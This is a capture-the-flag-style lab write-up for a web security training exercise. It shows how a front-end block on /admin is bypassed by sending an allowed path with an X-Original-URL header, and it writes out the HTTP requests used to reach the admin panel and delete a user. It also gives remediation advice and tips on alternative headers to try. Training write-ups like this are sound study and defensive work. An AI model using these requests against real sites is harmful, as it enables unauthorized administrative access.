# URL-based access control can be circumvented

**Category:** Access control / IDOR
**Level:** Practitioner
**Mechanism:** Front-end URL filter bypass via `X-Original-URL` header

**Lab URL:** https://portswigger.net/web-security/access-control/lab-url-based-access-control-can-be-circumvented

---

## Vulnerability

Access control to `/admin` is enforced by a **front-end** component that blocks the
path, but the **back-end** framework honours the `X-Original-URL` header to decide which
path it actually serves. The two layers inspect different things: the front-end filters
the request-line path, the back-end routes on the header. So a request whose request
line is an allowed path, carrying `X-Original-URL: /admin`, slips past the front-end and
reaches the admin functionality.

## Reconnaissance & Exploitation

Requesting `/admin` directly was blocked by the front-end with a plain response —
suggesting the block is an edge component, not the app:

```http
GET /admin HTTP/2
→ 403 Forbidden   "Access denied"
```

I tested whether the back-end honours `X-Original-URL` by requesting an allowed path
(`/`) in the request line and pointing the header at a non-existent path:

```http
GET / HTTP/2
X-Original-URL: /invalid
→ 404 Not Found   "Not Found"
```

The `404` (not `403`) proved it: the front-end passed `/` through, and the **back-end**
resolved the path from the header (`/invalid` → not found). Pointing the header at
`/admin` then returned the admin panel:

```http
GET / HTTP/2
X-Original-URL: /admin
→ 200 OK   (admin user list: wiener, carlos)
```

To delete carlos, the path goes in the header but the **query string must go in the
real request line** — `X-Original-URL` carries only the path, and the back-end appends
the request line's query string to it:

```http
GET /?username=carlos HTTP/2
Host: 0a1b00a5041cc10b82cf1aeb003a0059.web-security-academy.net
X-Original-URL: /admin/delete
Cookie: session=<redacted>
```

```http
HTTP/2 302 Found
Location: /admin
```

The back-end effectively served `/admin/delete?username=carlos`. The `302` to `/admin`
is the post-action redirect (delete done → go back to the user list), not an error —
carlos was deleted and the lab solved.

## Impact

Unauthenticated administrative access: the only thing protecting `/admin` was a
front-end path rule, and a single request header bypasses it entirely, exposing full
admin functionality (deleting users here). Any URL-based front-end control — WAF path
rules, reverse-proxy allow/deny lists — that the back-end can be told to re-route around
provides no real protection.

## Remediation

- Do not enforce access control at the front end on URL paths alone. Enforce
  authorisation in the **back-end application**, on the actual action, tied to the
  authenticated user's role.
- Strip or ignore request-routing headers (`X-Original-URL`, `X-Rewrite-URL`,
  `X-Forwarded-*`) at the edge unless they are explicitly needed and trusted.
- Defence in depth: the admin panel should require a real auth check, so even a reached
  `/admin` is useless without admin privileges (this lab's panel was unauthenticated —
  a second flaw).

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-284 (Improper Access Control); CWE-290 (Authentication Bypass by Spoofing)

## Notes

- Two-layer mental model: request line = what the front-end filters; `X-Original-URL` =
  the path the back-end actually routes on. Put an allowed path in the request line to
  pass the gate, put the real target in the header.
- `X-Original-URL` carries only the path. Query params go in the real request line and
  the back-end appends them — that's why delete needed `GET /?username=carlos` +
  `X-Original-URL: /admin/delete`.
- A `3xx` after a write action (delete/update) is normally "done, now redirecting", not
  a failure — read the Location and the resulting state, not just the status code.
- Sibling headers to try when one is filtered: `X-Rewrite-URL`, `X-Original-URL`.